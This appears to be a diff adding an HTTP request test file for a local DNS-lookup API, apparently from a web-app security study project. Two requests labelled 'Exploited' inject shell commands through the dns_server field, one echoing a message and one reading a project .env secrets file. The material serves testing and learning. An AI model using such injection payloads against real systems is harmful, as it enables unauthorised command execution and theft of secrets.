@@ -1,0 +1,39 @@
+### POST Expected Request
+POST http://localhost:8000/api/dns-info
+Content-Type: application/json
+Accept: application/json
+
+{
+    "domain": "romina.tech",
+    "dns_server": "8.8.8.8"
+}
+
+### POST Malformed Request
+POST http://localhost:8000/api/dns-info
+Content-Type: application/json
+Accept: application/json
+
+{
+    "domain": "romina.tech",
+    "dns_server": "sfa saf asf"
+}
+
+### POST Exploited Request (1)
+POST http://localhost:8000/api/dns-info
+Content-Type: application/json
+Accept: application/json
+
+{
+    "domain": "romina.tech",
+    "dns_server": "@8.8.8.8 romina.tech A | echo I have shell! "
+}
+
+### POST Exploited Request (2)
+POST http://localhost:8000/api/dns-info
+Content-Type: application/json
+Accept: application/json
+
+{
+    "domain": "romina.tech",
+    "dns_server": "@8.8.8.8 romina.tech A | echo $(cat /home/amirreza/projects/web-app-security/.env) "
+}
